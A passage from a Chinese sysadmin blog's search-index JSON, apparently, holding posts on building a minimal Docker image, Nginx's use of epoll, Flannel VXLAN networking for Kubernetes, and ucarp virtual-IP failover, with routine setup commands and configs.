\u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   apk add ca-certificates \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   update-ca-certificates \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   rm -rf /var/cache/apk/*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eWORKDIR /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCOPY --from\u003cspan class=\"o\"\u003e=\u003c/span\u003ebuild-env /app/goapp /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEXPOSE \u003cspan class=\"m\"\u003e8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eENTRYPOINT ./goapp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"面试之Docker如何打出最小的镜像"},{"content":"面试时被问到：是否了解 Nginx，它使用的 epoll 模式和其他的相比有什么优势？\n直接被问住，实际生产中配过不少的 Nginx，各种 rewrite、regex、正反向代理、php、fast-cgi、限流、证书、jwt、cors；epoll 只大概有印象是下面这行：\nevents { use epoll; worker_connections 1024; } 实在是汗颜啊，所以得仔细研究一下这个 epoll。\n首先扔概念 IO多路复用： 多路是指网络连接，复用指的是同一个线程。\nIO多路复用是一种同步IO模型，实现一个线程可以监视多个文件描述符；\n一旦某个描述符就绪（一般是读就绪或者写就绪），就能够通知应用程序进行相应的读写操作；\n没有文件描述符就绪时会阻塞应用程序，交出cpu。\n那么IO多路复用的实现方法有三种： select、poll、epoll select、poll、epoll本质上都是同步I/O，用户进程（这里就是Nginx）负责读写（从内核空间拷贝到用户空间），读写过程中，用户进程是阻塞的。\nselect：\n查询 fd_set 中，是否有就绪的 fd，可以设定一个超时时间，当有 fd (File descripter) 就绪或超时返回；\nfd_set 是一个位集合，大小是在编译内核时的常量，默认大小为 1024\n特点：\n连接数限制，fd_set 可表示的 fd 数量太小了；\n线性扫描：判断 fd 是否就绪，需要遍历一边 fd_set；\n数据复制：从内核空间拷贝到用户空间，复制连接就绪状态信息\npoll：\n解决了连接数限制：\npoll 中将 select 中的 fd_set 替换成了一个 pollfd 数组\n解决 fd 数量过小的问题\n数据复制：从内核空间拷贝到用户空间，复制连接就绪状态信息\nepoll：event 事件驱动\n事件机制：避免线性扫描\n为每个 fd，注册一个监听事件\nfd 变更为就绪时，将 fd 添加到就绪链表\nfd 数量：无限制（OS 级别的限制，单个进程能打开多少个 fd）\n区别在于:\nepoll较灵活，如果有一百万个链接状态同时保持，但是在某个时刻，只有几百个链接是活跃的。epoll的处理是通过epoll_create()创建对象，epoll_ctl()收集所有的套接字添加到epoll对象，epoll_wait()收集所有发生事件也就是所谓的活跃的链接，并收集到一个List链表中，这样只需要遍历这些List链表里的数据，而不用遍历一百万个链接。 而后者select poll则是每次收集事件时，将这一百万个链接都传给操作系统，再由操作系统内核上判断某些链接产生了事件，造成了巨大的资源浪费（大批量的不同态内存复制）。\n为什么epoll效率比较高：\nepoll 在epoll_create 时，就已经建立好了一个文件描述符对应 epoll 对象，同时，在内核 cache 里建立了一个红黑树，用于存储后续epoll_ctl传来的socket连接。再同时，又建立了一个list链表，用于存储准备就绪的事件。 等到 epoll_wait() 调用的时候，只需要观察list链表里有没有数据就可以，有数据就返回，没数据就sleep。等到timeout后，即使没数据，也返回了。所以 epoll_wait 会非常高效\n三者的比较：\nselect poll epoll 数据结构 bitmap 数组 红黑树 最大连接数 1024 无上限 无上限 fd拷贝 每次调用select拷贝 每次调用poll拷贝 fd首次调用epoll_ctl拷贝，每次调用epoll_wait不拷贝 工作效率 轮询：O(n) 轮询：O(n) 回调：O(1) Nginx 的并发处理能力 关于 Nginx 的并发处理能力：\n并发连接数，一般优化后，峰值能保持在 1~3w 左右。（内存和 CPU 核心数不同，会有进一步优化空间） Nginx 的最大连接数：Worker 进程数量 x 单个 Worker 进程的最大连接数 ","permalink":"https://rendoumi.com/posts/20220401-nginx_epoll/","summary":"\u003cp\u003e面试时被问到：是否了解 Nginx，它使用的 epoll 模式和其他的相比有什么优势？\u003c/p\u003e\n\u003cp\u003e直接被问住，实际生产中配过不少的 Nginx，各种 rewrite、regex、正反向代理、php、fast-cgi、限流、证书、jwt、cors；epoll 只大概有印象是下面这行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eevents \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    use epoll\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    worker_connections  1024\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e实在是汗颜啊，所以得仔细研究一下这个 epoll。\u003c/p\u003e\n\u003ch4 id=\"首先扔概念\"\u003e首先扔概念\u003c/h4\u003e\n\u003ch4 id=\"io多路复用\"\u003eIO多路复用：\u003c/h4\u003e\n\u003cp\u003e多路是指网络连接，复用指的是同一个线程。\u003c/p\u003e\n\u003cp\u003eIO多路复用是一种同步IO模型，实现一个线程可以监视多个文件描述符；\u003c/p\u003e\n\u003cp\u003e一旦某个描述符就绪（一般是读就绪或者写就绪），就能够通知应用程序进行相应的读写操作；\u003c/p\u003e\n\u003cp\u003e没有文件描述符就绪时会阻塞应用程序，交出cpu。\u003c/p\u003e\n\u003ch4 id=\"那么io多路复用的实现方法有三种-selectpollepoll\"\u003e那么IO多路复用的实现方法有三种： select、poll、epoll\u003c/h4\u003e\n\u003cp\u003eselect、poll、epoll本质上都是同步I/O，用户进程（这里就是Nginx）负责读写（从内核空间拷贝到用户空间），读写过程中，用户进程是阻塞的。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eselect：\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e查询 fd_set 中，是否有就绪的 fd，可以设定一个超时时间，当有 fd (File descripter) 就绪或超时返回；\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003efd_set 是一个位集合，大小是在编译内核时的常量，默认大小为 1024\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e特点：\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e连接数限制，fd_set 可表示的 fd 数量太小了；\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e线性扫描：判断 fd 是否就绪，需要遍历一边 fd_set；\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e数据复制：从内核空间拷贝到用户空间，复制连接就绪状态信息\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003epoll：\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e解决了连接数限制：\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003epoll 中将 select 中的 fd_set 替换成了一个 pollfd 数组\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e解决 fd 数量过小的问题\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e数据复制：从内核空间拷贝到用户空间，复制连接就绪状态信息\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eepoll：event 事件驱动\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e事件机制：避免线性扫描\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e为每个 fd，注册一个监听事件\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003efd 变更为就绪时，将 fd 添加到就绪链表\u003c/p\u003e","title":"面试之Nginx的epoll的优势"},{"content":"现在各大公有云的 k8s 网络插件基本用的都是 vxlan，我们也需要对这个进行一下详细了解，以便用于公司的正式生产环境。\n一、原理 首先，kubernetes的网络模型：\n包含三要素：\n所有的容器(container)之间能够在不使用 NAT 的情况下互相通讯\n所有的节点(Node)能够在不使用 NAT 的情况下跟所有的容器(container)互相通讯（反之容器访问节点亦然）\n容器(container)中的IP地址，在容器内和容器外面看起来是一样的\n那来到 flannel，它是一种 Overlay network 覆盖网络，盖在原有的 Node 网络基础上： 上图要仔细分析， K8S 中存在三个+一个网络段：\nnode 网络段，上图是 172.20.32.0/19，这是基础网络段 pod 网络段，100.96.0.0/16，2¹⁶(65536)个IP，这是由 flannel 产生的 overlay network，所有的 pod 都站在一个大广场上，互相可见 svc 网络段，上图未提，我们需要知道，想要把 pod 的 ip 给固定下来，就得使用 svc 来分配固定的域名，这个是由 iptables 来维护的 In-Host docker network网络段，这是每个 Node 主机的单独网络段，flannel给每个 Node 主机划分了一个 100.96.x.0/24 段，然后在 etcd 内进行维护，来避免不同的 Node 主机分配IP冲突。 综述：flannel 为每个 Node 分配一个 subnet，容器(container)从此 subnet 中分配 IP，这些 IP 可以在 Node 间路由，容器间无需 NAT 和 port mapping 就可以跨主机通信。\n每个 subnet 都是从一个更大的 IP 池中划分的，flannel 会在每个 Node 上运行一个叫 flanneld 的 agent，其职责就是从池子中分配 subnet。为了在各个主机间共享信息，flannel 用 etcd（与 consul 类似的 key-value 分布式数据库）存放网络配置、已分配的 subnet、host 的 IP 等信息。\n数据包如何在主机间转发是由 backend 实现的。flannel 提供了多种 backend，最常用的有 vxlan 和 host-gw，udp 万万不可使用。\n仔细分析一下两个不同主机上的container跨主机互相通讯的过程：\ncontainer-1 首先建立 IP 包， src: 100.96.1.2 -\u0026gt; dst: 100.96.2.3, 包发到 docker0 网桥，docker0 是 container-1 的缺省 gateway 网关。\n在每个 Node 上，flannel 都会跑一个flanneld的守护进程，它会在 Linux 的 kernel 路由表中建立若干条路由， Node1 的路由表如下:\nadmin@ip-172-20-33-102:~$ ip route default via 172.20.32.1 dev eth0 100.96.0.0/16 dev flannel0 proto kernel scope link src 100.96.1.0 100.96.1.0/24 dev docker0 proto kernel scope link src 100.96.1.1 172.20.32.0/19 dev eth0 proto kernel scope link src 172.20.33.102 对照路由表，dst 100.96.2.3 的路由会落到 100.96.0.0/16 这一条上，也就是说会落到 flannel0 这个设备上继续转发出去。\nflannel0 呢本质上是一个由flanneld 进程建立的 TUN 虚拟网卡设备：\n写TUN：当 IP 包写到flannel0后，会转发到 kernel，然后 kernel 查路由表再转发 读TUN：当 IP 包首先到达核心，路由表显示下一跳是flannel0虚拟网卡，kernel会直接把包发到产生这个虚拟网卡的进程去，也就是flanneld进行读包 看上图，IP 包首先到达 Docker0，因为它是网关，然后查内核路由表，到达flannel0虚拟网卡，然后就到达flanneld进程读包， 这时候flanneld会做什么呢？\nflanneld从 etcd 中获得各个主机网段对应的节点信息：\nadmin@ip-172-20-33-102:~$ etcdctl ls /coreos.com/network/subnets /coreos.com/network/subnets/100.96.1.0-24 /coreos.com/network/subnets/100.96.2.0-24 /coreos.com/network/subnets/100.96.3.0-24 admin@ip-172-20-33-102:~$ etcdctl get /coreos.com/network/subnets/100.96.2.0-24 {\u0026#34;PublicIP\u0026#34;:\u0026#34;172.20.54.98\u0026#34;} 于是乎 Node1 上面的 flanneld 进程得知 100.96.2.3 IP对应的网段是 100.96.2.0/24 ，再进一步对应到 Node2 的公网IP 172.20.54.98，然后它就会继续封装这个IP包，用UDP或者VXLAN，把这个 IP 包再包裹一层封起来送到 Node2 的 flanneld 进程去。\nNode2：包首先从网卡到达 Node2 的核心 kernel，路由表显示下一跳是flannel0 虚拟网卡，包就转发到 flanneld 进程读包，flanneld接收到包后，就会做拆包，拆完包直接写包到 TUN，然后包到达本地核心路由，再查路由表转发到docker0，最终到达 container-2\n我们同样可以查看 Node2 的路由表，应该显示如下结果：\nadmin@ip-172-20-54-98:~$ ip route default via 172.20.32.1 dev eth0 100.96.0.0/16 dev flannel0 proto kernel scope link src 100.96.2.0 100.96.2.0/24 dev docker0 proto kernel scope link src 100.96.2.1 172.20.32.0/19 dev eth0 proto kernel scope link src 172.20.54.98 这样整个过程就明晰了。\n道理明晰了，下面我们就需要来实际操作了。\n二、实战 直接在 k8s 里装就很简单，用 yaml 一步操作就行了，这里我们不做任何介绍。\n我们下面说的是如何单独把 flannel 单独拿出来使用：\n1、首先要装etcd 参照之前的帖子：Etcd单节点应用\n这里也给出不用Docker，用systemctl来运行的方案：\n准备工作，关闭selinux，打开包转发：\necho 1 \u0026gt; /proc/sys/net/ipv4/ip_forward #或者修改/etc/sysctl.conf，然后sysctl -p #net.ipv4.ip_forward = 1 systemctl disable firewalld.service systemctl stop firewalld.service iptables -P FORWARD ACCEPT 安装 etcd ：\nyum install etcd -y cp /etc/etcd/etcd.conf/etc/etcd/etcd.conf.bak vi /etc/etcd/etcd.conf ETCD_LISTEN_PEER_URLS=\u0026#34;http://172.16.9.110:2380\u0026#34; ETCD_LISTEN_CLIENT_URLS=http://172.16.9.110:2379,http://127.0.0.1:2379 ETCD_NAME=\u0026#34;default\u0026#34; ETCD_INITIAL_ADVERTISE_PEER_URLS=\u0026#34;http://172.16.9.110:2380\u0026#34; ETCD_ADVERTISE_CLIENT_URLS=http://172.16.9.110:2379 systemctl enable --now etcd 配置 etcd：\nvi /root/etcd.sh { \u0026#34;Network\u0026#34;: \u0026#34;10.10.0.0/16\u0026#34;,\u0026#34;SubnetLen\u0026#34;: 24,\u0026#34;Backend\u0026#34;: {\u0026#34;Type\u0026#34;:\u0026#34;vxlan\u0026#34;} } etcdctl --endpoints=http://172.16.9.110:2379 set kubernetes‑cluster/network/config \u0026lt; /root/etcd.sh etcdctl ls kubernetes‑cluster/network/config curl -s http://172.16.9.110:2379/v2/keys/kubernetes‑cluster/network/subnets 解释一下：pod 的网段是 10.10.0.0/16，掩码是 /16 ，本地 Node 主机的掩码是/24，也就是说一台宿主机上最多产256台container。\n然后 etcd 的 key 是 kubernetes‑cluster/network\n2、然后装 flannel： 注意 etcd 的配置跟上面一致：\nyum install flannel -y cp /etc/sysconfig/flanneld/etc/sysconfig/flanneld.bak vi/etc/sysconfig/flanneld FLANNEL_ETCD_ENDPOINTS=http://172.16.9.110:2379 FLANNEL_ETCD_PREFIX=\u0026#34;kubernetes‑cluster/network\u0026#34; systemctl enable --now flanneld 3、重启Docker 编辑docker启动配置文件：\ncat /run/flannel/subnet.env FLANNEL_NETWORK=10.10.0.0/16 FLANNEL_SUBNET=10.10.1.1/24 FLANNEL_MTU=1450 FLANNEL_IPMASQ=false /usr/lib/systemd/system/docker.service # Add: --bip= and --mtu= vi /usr/lib/systemd/system/docker.service dockerd --bip=$FLANNEL_SUBNET --mtu=$FLANNEL_MTU 或者 cat /run/flannel/docker DOCKER_OPT_BIP=\u0026#34;‑‑bip=10.10.1.1/24\u0026#34; DOCKER_OPT_IPMASQ=\u0026#34;‑‑ip‑masq=true\u0026#34; DOCKER_OPT_MTU=\u0026#34;‑‑mtu=1450\u0026#34; DOCKER_NETWORK_OPTIONS=\u0026#34; ‑‑bip=10.10.1.1/24 ‑‑ip‑masq=false ‑‑mtu=1450 \u0026#34; cat /etc/systemd/system/docker.service.d/docker.conf ServiceEnvironmentFile=‑/etc/sysconfig/docker EnvironmentFile=‑/etc/sysconfig/docker‑storage EnvironmentFile=‑/etc/sysconfig/docker‑network EnvironmentFile=‑/run/flannel/docker ExecStart= ExecStart=/usr/bin/dockerd $OPTIONS $DOCKER_STORAGE_OPTIONS $DOCKER_NETWORK_OPTIONS $BLOCK_REGISTRY $INSECURE_REGISTRY 然后就可以了。\n那么为什么 flannel 不用 UDP 呢？\n看上图，包从用户空间到内核空间的流入流出，会经过1、2、3的来回拷贝翻转，性能损失较大，所以 UDP 只能用在测试环境。\n最后 flannel 的 VXLAN 和 HOST-GW 又有什么区别呢？\n与 vxlan 不同，host-gw 不会封装数据包，而是在主机的路由表中创建到其他主机 subnet 的路由条目，从而实现容器跨主机通信 host-gw 把每个主机都配置成网关，主机知道其他主机的 subnet 和转发地址。 vxlan 则在主机间建立隧道，不同主机的容器都在一个大的网段内（比如 10.2.0.0/16）。 虽然 vxlan 与 host-gw 使用不同的机制建立主机之间连接，但对于容器则无需任何改变。 由于 vxlan 需要对数据进行额外打包和拆包，性能会稍逊于 host-gw。 ","permalink":"https://rendoumi.com/posts/20220317-kubernetes_flannel/","summary":"\u003cp\u003e现在各大公有云的 k8s 网络插件基本用的都是 vxlan，我们也需要对这个进行一下详细了解，以便用于公司的正式生产环境。\u003c/p\u003e\n\u003ch2 id=\"一原理\"\u003e一、原理\u003c/h2\u003e\n\u003cp\u003e首先，kubernetes的网络模型：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220317101247744\" loading=\"lazy\" src=\"/posts/20220317-kubernetes_flannel/image-20220317101247744.png\"\u003e\u003c/p\u003e\n\u003cp\u003e包含三要素：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e所有的容器(container)之间能够在不使用 NAT 的情况下互相通讯\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e所有的节点(Node)能够在不使用 NAT 的情况下跟所有的容器(container)互相通讯（反之容器访问节点亦然）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e容器(container)中的IP地址，在容器内和容器外面看起来是一样的\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e那来到 flannel，它是一种 Overlay network 覆盖网络，盖在原有的 Node 网络基础上：\n\u003cimg alt=\"image-20220317101802355\" loading=\"lazy\" src=\"/posts/20220317-kubernetes_flannel/image-20220317101802355.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上图要仔细分析， K8S 中存在三个+一个网络段：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003enode 网络段，上图是 172.20.32.0/19，这是基础网络段\u003c/li\u003e\n\u003cli\u003epod 网络段，100.96.0.0/16，2¹⁶(65536)个IP，这是由 flannel 产生的 overlay network，所有的 pod 都站在一个大广场上，互相可见\u003c/li\u003e\n\u003cli\u003esvc 网络段，上图未提，我们需要知道，想要把 pod 的 ip 给固定下来，就得使用 svc 来分配固定的域名，这个是由 iptables 来维护的\u003c/li\u003e\n\u003cli\u003eIn-Host docker network网络段，这是每个 Node 主机的单独网络段，flannel给每个 Node 主机划分了一个 100.96.x.0/24 段，然后在 etcd 内进行维护，来避免不同的 Node 主机分配IP冲突。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e综述：flannel 为每个 Node 分配一个 subnet，容器(container)从此 subnet 中分配 IP，这些 IP 可以在 Node 间路由，容器间无需 NAT 和 port mapping 就可以跨主机通信。\u003c/p\u003e","title":"Kubernetes下Flannel网络"},{"content":"有 V2EX 的坛友问到如何静态编译 keepalived 的问题，实际上 keepalived 确实配置比较麻烦。那还有一个简单易行的 ucarp，生产也可以用这个。\nucarp 跟 keepalived 一样，都是用于高可用的 IP 漂移\n但是比 keepalived 配置简单，而且 opnsense 就是用的这个做的高可用，opnsense 是个非常可靠的防火墙软件。\n首先有两台虚机，172.18.19.1和172.18.19.2，虚拟ip是172.18.19.3\n先配置172.18.19.1\nyum install epel-release yum install psmisc yum install ucarp cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/ucarp.service [Unit] Description=UCARP virtual interface After=network.target [Service] Type=simple ExecStart=/usr/local/bin/ucarp.sh RemainAfterExit=true ExecStop=/usr/bin/killall -SIGTERM ucarp ExecStop=/bin/sleep 10 TimeoutStopSec=30 StandardOutput=journal [Install] WantedBy=multi-user.target EOF 注意，上面我们的systemd是直接调用了ucarp.sh来启动，这样更简单。 三个脚本，注意权限是755 cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/ucarp.sh #!/bin/bash\u0026#39; /usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.1 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh EOF cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-up.sh #!/bin/sh /sbin/ip addr add ${2}/24 dev ${1} /sbin/ip neigh flush dev ${1} EOF cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-down.sh #!/bin/sh /sbin/ip addr del ${2}/24 dev ${1} /usr/sbin/arp -d ${2} EOF chmod 755 /usr/local/bin/ucarp.sh /usr/local/bin/vip-up.sh /usr/local/bin/vip-down.sh ok，第一台机器就配置好了\n所有的东西都在ucarp.sh的那一行的参数上，直接用ucarp -h来查看\n配置第二台172.18.19.2，其他的东西都一样，唯一不同的就是ucapr.sh的一处不一样\ncat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/ucarp.sh #!/bin/bash\u0026#39; /usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.2 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh EOF # -s 172.18.19.2 源ip和19.1不同 ok，两台都配置完毕, 分别执行启动\nsystemctl daemon-reload systemctl enable --now ucarp 可以再找一台机器，一直长 ping 172.18.19.3，然后随机杀掉 19.1 和 19.2 上面的 ucarp 进程，可以看到 vip 172.18.19.3 会来回飘\n注意：如果主掉了，从接管了 vip 变成 master，那么主再起来的时候不会去抢从的 master。\n","permalink":"https://rendoumi.com/posts/20220225-ucarp/","summary":"\u003cp\u003e有 V2EX 的坛友问到如何静态编译 keepalived 的问题，实际上 keepalived 确实配置比较麻烦。那还有一个简单易行的 ucarp，生产也可以用这个。\u003c/p\u003e\n\u003cp\u003eucarp 跟 keepalived 一样，都是用于高可用的 IP 漂移\u003c/p\u003e\n\u003cp\u003e但是比 keepalived 配置简单，而且 opnsense 就是用的这个做的高可用，opnsense 是个非常可靠的防火墙软件。\u003c/p\u003e\n\u003cp\u003e首先有两台虚机，172.18.19.1和172.18.19.2，虚拟ip是172.18.19.3\u003c/p\u003e\n\u003cp\u003e先配置172.18.19.1\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install psmisc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install ucarp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/ucarp.service\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=UCARP virtual interface\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/usr/local/bin/ucarp.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRemainAfterExit=true\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStop=/usr/bin/killall -SIGTERM ucarp\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStop=/bin/sleep 10\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eTimeoutStopSec=30\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eStandardOutput=journal\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e注意，上面我们的systemd是直接调用了ucarp.sh来启动，这样更简单。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e三个脚本，注意权限是755\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/ucarp.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/bash\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.1 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-up.sh \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/sbin/ip addr add ${2}/24 dev 